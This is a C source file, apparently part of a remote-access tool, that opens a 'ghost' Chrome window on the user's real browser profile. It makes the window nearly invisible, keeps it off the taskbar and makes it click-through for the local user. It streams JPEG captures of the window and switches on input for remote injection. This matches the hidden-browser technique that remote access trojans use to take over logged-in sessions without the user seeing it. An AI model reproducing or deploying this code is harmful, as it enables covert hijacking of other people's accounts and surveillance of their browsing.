/**
 * remote_hidden_browser.c
 * Ghost Chrome/Edge window: launch, reuse, capture, close.
 * Default: Chrome, profile Default, url chrome://newtab.
 * Transparency from config GhostTransparency (0..100).
 */
#include "pch.h"
#include "remote_hidden_browser.h"
#include "remote_config.h"
#include "remote_desktop.h"
#include "remote_log.h"
#include "gdiplus_jpeg.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 2
#endif

#define GHOST_PROP_NAME "WEBRTC_GHOST_AGENT"
#define GHOST_STATE_FILENAME "chrome_ghost_Default.json"
#define MAX_PATH_EX 512
#define REMOTE_HIDDEN_BROWSER_MAX_W 1920
#define REMOTE_HIDDEN_BROWSER_MAX_H 1080

static HWND g_ghost_hwnd = NULL;
static int g_ghost_alpha = 13;

static void put_u32(unsigned char* out, unsigned int v) {
    out[0] = (unsigned char)(v);
    out[1] = (unsigned char)(v >> 8);
    out[2] = (unsigned char)(v >> 16);
    out[3] = (unsigned char)(v >> 24);
}

static int get_temp_path(char* out, size_t size) {
    DWORD n = GetTempPathA((DWORD)size, out);
    return (n > 0 && n < (DWORD)size) ? 1 : 0;
}

static int is_valid_hwnd(HWND h) {
    return h && IsWindow(h);
}

static DWORD get_hwnd_pid(HWND h) {
    DWORD pid = 0;
    GetWindowThreadProcessId(h, &pid);
    return pid;
}

static int get_prop(HWND h, const char* name) {
    return (int)(INT_PTR)GetPropA(h, name);
}

static void set_prop(HWND h, const char* name, HANDLE val) {
    SetPropA(h, name, val);
}

static int is_marked_ghost(HWND h) {
    return get_prop(h, GHOST_PROP_NAME) != 0;
}

static void mark_ghost(HWND h) {
    set_prop(h, GHOST_PROP_NAME, (HANDLE)1);
}

static void remove_ghost_mark(HWND h) {
    RemovePropA(h, GHOST_PROP_NAME);
}

typedef struct { HWND* arr; int cap; int n; } enum_ctx_t;

static BOOL CALLBACK enum_chrome_cb(HWND h, LPARAM lp) {
    char cls[64] = { 0 };
    GetClassNameA(h, cls, (int)(sizeof(cls) - 1));
    if (strcmp(cls, "Chrome_WidgetWin_1") != 0) return TRUE;
    enum_ctx_t* ctx = (enum_ctx_t*)lp;
    if (ctx->n < ctx->cap)
        ctx->arr[ctx->n++] = h;
    return TRUE;
}

static int list_chrome_hwnds(HWND* out, int max_count) {
    enum_ctx_t ctx = { out, max_count, 0 };
    EnumWindows(enum_chrome_cb, (LPARAM)&ctx);
    return ctx.n;
}

static int get_class_is_chrome(HWND h) {
    char cls[64] = { 0 };
    GetClassNameA(h, cls, (int)(sizeof(cls) - 1));
    return (strcmp(cls, "Chrome_WidgetWin_1") == 0);
}

static int is_ghost_window(HWND h) {
    if (is_marked_ghost(h)) return 1;
    if (!get_class_is_chrome(h)) return 0;
    LONG ex = GetWindowLongA(h, GWL_EXSTYLE);
    return (ex & (WS_EX_LAYERED | WS_EX_TOOLWINDOW)) == (WS_EX_LAYERED | WS_EX_TOOLWINDOW);
}

static void restore_window(HWND h) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(h, HWND_TOP, 0, 0, sw, sh, SWP_SHOWWINDOW | SWP_NOACTIVATE);
}

static void move_window_to_display(HWND h, int display_index) {
    int mon_x = 0, mon_y = 0;
    unsigned int mon_w = 0, mon_h = 0;
    remote_desktop_get_monitor_bounds(display_index, &mon_x, &mon_y, &mon_w, &mon_h);
    if (mon_w > 0 && mon_h > 0)
        SetWindowPos(h, HWND_TOP, mon_x, mon_y, (int)mon_w, (int)mon_h, SWP_SHOWWINDOW | SWP_NOACTIVATE);
}

static void apply_ghost(HWND h, int enable, int alpha) {
    LONG ex = GetWindowLongA(h, GWL_EXSTYLE);
    ex |= WS_EX_LAYERED | WS_EX_TOOLWINDOW;
    ex &= ~WS_EX_APPWINDOW;
    if (enable) {
        ex |= WS_EX_TRANSPARENT; /* local user input passes through */
        SetWindowLongA(h, GWL_EXSTYLE, ex);
        SetLayeredWindowAttributes(h, 0, (BYTE)alpha, LWA_ALPHA);
        mark_ghost(h);
    } else {
        ex &= ~WS_EX_TRANSPARENT;
        SetWindowLongA(h, GWL_EXSTYLE, ex);
        SetLayeredWindowAttributes(h, 0, 255, LWA_ALPHA);
    }
    restore_window(h);
}

/* Temporarily allow ghost to receive input for remote injection. Call release_after_input when done. */
void remote_hidden_browser_prepare_for_input(void) {
    if (!g_ghost_hwnd || !is_valid_hwnd(g_ghost_hwnd)) return;
    LONG ex = GetWindowLongA(g_ghost_hwnd, GWL_EXSTYLE);
    ex &= ~WS_EX_TRANSPARENT;
    SetWindowLongA(g_ghost_hwnd, GWL_EXSTYLE, ex);
}

void remote_hidden_browser_release_after_input(void) {
    if (!g_ghost_hwnd || !is_valid_hwnd(g_ghost_hwnd)) return;
    LONG ex = GetWindowLongA(g_ghost_hwnd, GWL_EXSTYLE);
    ex |= WS_EX_TRANSPARENT;
    SetWindowLongA(g_ghost_hwnd, GWL_EXSTYLE, ex);
}

static const char* find_chrome_exe(void) {
    static char s_path[MAX_PATH_EX] = { 0 };
    char pf[260], pfx86[260], lad[260];
    char cand[260];

    if (s_path[0]) return s_path;

    GetEnvironmentVariableA("ProgramFiles", pf, sizeof(pf));
    GetEnvironmentVariableA("ProgramFiles(x86)", pfx86, sizeof(pfx86));
    GetEnvironmentVariableA("LOCALAPPDATA", lad, sizeof(lad));
    if (!pf[0]) strcpy_s(pf, sizeof(pf), "C:\\Program Files");
    if (!pfx86[0]) strcpy_s(pfx86, sizeof(pfx86), "C:\\Program Files (x86)");
    if (!lad[0]) ExpandEnvironmentStringsA("%LOCALAPPDATA%", lad, (DWORD)sizeof(lad));

    sprintf_s(cand, sizeof(cand), "%s\\Google\\Chrome\\Application\\chrome.exe", pf);
    if (GetFileAttributesA(cand) != INVALID_FILE_ATTRIBUTES) { strcpy_s(s_path, sizeof(s_path), cand); return s_path; }
    sprintf_s(cand, sizeof(cand), "%s\\Google\\Chrome\\Application\\chrome.exe", pfx86);
    if (GetFileAttributesA(cand) != INVALID_FILE_ATTRIBUTES) { strcpy_s(s_path, sizeof(s_path), cand); return s_path; }
    sprintf_s(cand, sizeof(cand), "%s\\Google\\Chrome\\Application\\chrome.exe", lad);
    if (GetFileAttributesA(cand) != INVALID_FILE_ATTRIBUTES) { strcpy_s(s_path, sizeof(s_path), cand); return s_path; }
    strcpy_s(s_path, sizeof(s_path), "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
    return s_path;
}

static const char* user_data_root(void) {
    static char s[MAX_PATH_EX] = { 0 };
    if (s[0]) return s;
    char lad[MAX_PATH_EX] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%", lad, (DWORD)sizeof(lad));
    sprintf_s(s, sizeof(s), "%s\\Google\\Chrome\\User Data", lad);
    return s;
}

static void clear_ghost_state(void) {
    char path[MAX_PATH_EX];
    if (!get_temp_path(path, sizeof(path))) return;
    strcat_s(path, sizeof(path), GHOST_STATE_FILENAME);
    DeleteFileA(path);
}

static void persist_ghost(HWND h) {
    char path[MAX_PATH_EX];
    if (!get_temp_path(path, sizeof(path))) return;
    strcat_s(path, sizeof(path), GHOST_STATE_FILENAME);
    FILE* f = NULL;
    if (fopen_s(&f, path, "w") != 0 || !f) return;
    fprintf(f, "{\"hwnd\":%ld,\"pid\":%lu,\"browser\":\"chrome\"}\n",
        (long)(INT_PTR)h, (unsigned long)get_hwnd_pid(h));
    fclose(f);
}

static HWND try_reuse_ghost(void) {
    char path[MAX_PATH_EX];
    if (!get_temp_path(path, sizeof(path))) return NULL;
    strcat_s(path, sizeof(path), GHOST_STATE_FILENAME);
    FILE* f = NULL;
    if (fopen_s(&f, path, "r") != 0 || !f) return NULL;
    char buf[256];
    if (!fgets(buf, (int)sizeof(buf), f)) { fclose(f); return NULL; }
    fclose(f);
    long hwnd_val = 0;
    if (sscanf_s(buf, "{\"hwnd\":%ld", &hwnd_val) < 1) return NULL;
    HWND h = (HWND)(INT_PTR)hwnd_val;
    if (!is_valid_hwnd(h) || !is_ghost_window(h)) return NULL;
    apply_ghost(h, 1, g_ghost_alpha);
    return h;
}

static int is_in_set(HWND h, HWND* set, int n) {
    int i;
    for (i = 0; i < n; i++)
        if (set[i] == h) return 1;
    return 0;
}

static HWND wait_new_chrome(HWND* before_set, int before_count, int timeout_ms) {
    DWORD start = GetTickCount();
    HWND now[64];
    int i, nn;
    while (GetTickCount() - start < (DWORD)timeout_ms) {
        Sleep(150);
        nn = list_chrome_hwnds(now, 64);
        for (i = 0; i < nn; i++) {
            if (!is_in_set(now[i], before_set, before_count) && get_class_is_chrome(now[i]))
                return now[i];
        }
    }
    return NULL;
}

static HWND launch_ghost_window(const char* profile, const char* url) {
    const char* exe = find_chrome_exe();
    char user_data[MAX_PATH_EX];
    strcpy_s(user_data, sizeof(user_data), user_data_root());
    const char* prof = (profile && profile[0]) ? profile : "Default";
    const char* u = (url && url[0]) ? url : "chrome://newtab";

    HWND before[64] = { 0 };
    int n = list_chrome_hwnds(before, 64);

    char cmd[1024];
    sprintf_s(cmd, sizeof(cmd), "\"%s\" --user-data-dir=\"%s\" --profile-directory=\"%s\" --new-window \"%s\" "
        "--no-first-run --no-default-browser-check --disable-background-timer-throttling "
        "--disable-renderer-backgrounding --disable-session-crashed-bubble --hide-crash-restore-bubble",
        exe, user_data, prof, u);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNOACTIVATE;

    remote_log("[hidden_browser] launching: %s", exe);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        remote_log("[hidden_browser] CreateProcess failed: %lu", GetLastError());
        return NULL;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    HWND h = wait_new_chrome(before, n, 10000);
    if (!h) {
        remote_log("[hidden_browser] no new window found");
        return NULL;
    }
    remote_log("[hidden_browser] ghost hwnd=%p", (void*)h);
    apply_ghost(h, 1, g_ghost_alpha);
    persist_ghost(h);
    return h;
}

static int close_window(HWND h, int timeout_ms) {
    if (!is_valid_hwnd(h)) return 1;
    PostMessage(h, WM_CLOSE, 0, 0);
    DWORD start = GetTickCount();
    while (GetTickCount() - start < (DWORD)timeout_ms) {
        if (!is_valid_hwnd(h)) return 1;
        Sleep(50);
    }
    return is_valid_hwnd(h) ? 0 : 1;
}

static unsigned int capture_window_jpeg(HWND h, int quality, unsigned char* out, unsigned int out_size) {
    RECT r;
    if (!GetWindowRect(h, &r)) return 0;
    int w = r.right - r.left;
    int h_ = r.bottom - r.top;
    if (w <= 0 || h_ <= 0) return 0;
    if (w > 4096 || h_ > 4096) return 0;
    if (quality <= 0) quality = 75;
    if (quality > 100) quality = 100;

    HDC hwnd_dc = GetWindowDC(h);
    if (!hwnd_dc) return 0;
    HDC mem_dc = CreateCompatibleDC(hwnd_dc);
    HBITMAP bmp = CreateCompatibleBitmap(hwnd_dc, w, h_);
    if (!mem_dc || !bmp) {
        if (bmp) DeleteObject(bmp);
        if (mem_dc) DeleteDC(mem_dc);
        ReleaseDC(h, hwnd_dc);
        return 0;
    }
    SelectObject(mem_dc, bmp);
    int ok = PrintWindow(h, mem_dc, PW_RENDERFULLCONTENT);
    if (!ok) {
        DeleteObject(bmp);
        DeleteDC(mem_dc);
        ReleaseDC(h, hwnd_dc);
        return 0;
    }

    BITMAPINFOHEADER bi = { 0 };
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = w;
    bi.biHeight = -h_;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    unsigned int stride = ((unsigned int)w * 4 + 3) & ~3u;
    unsigned char* bgra = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, stride * (unsigned int)h_);
    if (!bgra) {
        DeleteObject(bmp); DeleteDC(mem_dc); ReleaseDC(h, hwnd_dc);
        return 0;
    }
    GetDIBits(mem_dc, bmp, 0, (UINT)h_, bgra, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    DeleteObject(bmp);
    DeleteDC(mem_dc);
    ReleaseDC(h, hwnd_dc);

    unsigned char* jpeg = NULL;
    unsigned int jlen = 0;
    if (!gdiplus_jpeg_encode_bgra(w, h_, (int)stride, bgra, quality, &jpeg, &jlen) || !jpeg) {
        HeapFree(GetProcessHeap(), 0, bgra);
        return 0;
    }
    HeapFree(GetProcessHeap(), 0, bgra);

    unsigned int total = 4 + jlen;
    if (out_size < total) {
        HeapFree(GetProcessHeap(), 0, jpeg);
        return 0;
    }
    put_u32(out, jlen);
    memcpy(out + 4, jpeg, (size_t)jlen);
    HeapFree(GetProcessHeap(), 0, jpeg);
    return total;
}

int remote_hidden_browser_start(const char* profile, const char* url, int ghost_alpha, int display_index) {
    if (ghost_alpha >= 0 && ghost_alpha <= 255)
        g_ghost_alpha = ghost_alpha;
    else {
        remote_config_t cfg;
        if (remote_config_load(&cfg) && cfg.valid) {
            int pct = cfg.ghost_transparency;
            if (pct < 0) pct = 0;
            if (pct > 100) pct = 100;
            int opaque = 100 - pct;
            g_ghost_alpha = (int)(255.0 * (opaque / 100.0) + 0.5);
            if (g_ghost_alpha < 0) g_ghost_alpha = 0;
            if (g_ghost_alpha > 255) g_ghost_alpha = 255;
        }
    }
    if (display_index < 0) display_index = 0;

    g_ghost_hwnd = try_reuse_ghost();
    if (g_ghost_hwnd) {
        remote_log("[hidden_browser] reused hwnd=%p", (void*)g_ghost_hwnd);
        move_window_to_display(g_ghost_hwnd, display_index);
        return 1;
    }
    g_ghost_hwnd = launch_ghost_window(profile, url);
    if (g_ghost_hwnd) {
        move_window_to_display(g_ghost_hwnd, display_index);
        return 1;
    }
    return 0;
}

unsigned int remote_hidden_browser_capture_frame(unsigned char* out_data, unsigned int out_size, int quality) {
    if (!g_ghost_hwnd || !is_valid_hwnd(g_ghost_hwnd))
        return 0;
    return capture_window_jpeg(g_ghost_hwnd, quality, out_data, out_size);
}

/* Returns: 0 = failed, 1 = success (window closed), 2 = no ghost window was open. */
int remote_hidden_browser_close(void) {
    if (!g_ghost_hwnd) {
        clear_ghost_state();
        return 2; /* no ghost window */
    }
    if (!is_ghost_window(g_ghost_hwnd)) {
        remote_log("[hidden_browser] refusing to close non-ghost hwnd=%p", (void*)g_ghost_hwnd);
        g_ghost_hwnd = NULL;
        return 0;
    }
    remove_ghost_mark(g_ghost_hwnd);
    int ok = close_window(g_ghost_hwnd, 3000);
    clear_ghost_state();
    g_ghost_hwnd = NULL;
    remote_log("[hidden_browser] closed, ok=%d", ok);
    return ok ? 1 : 0;
}

int remote_hidden_browser_is_active(void) {
    if (!g_ghost_hwnd || !is_valid_hwnd(g_ghost_hwnd)) return 0;
    return 1;
}

int remote_hidden_browser_get_bounds(unsigned int* out_w, unsigned int* out_h) {
    if (!g_ghost_hwnd || !is_valid_hwnd(g_ghost_hwnd)) return 0;
    RECT r;
    if (!GetWindowRect(g_ghost_hwnd, &r)) return 0;
    if (out_w) *out_w = (unsigned int)(r.right - r.left);
    if (out_h) *out_h = (unsigned int)(r.bottom - r.top);
    return 1;
}

void* remote_hidden_browser_get_hwnd(void) {
    return g_ghost_hwnd;
}
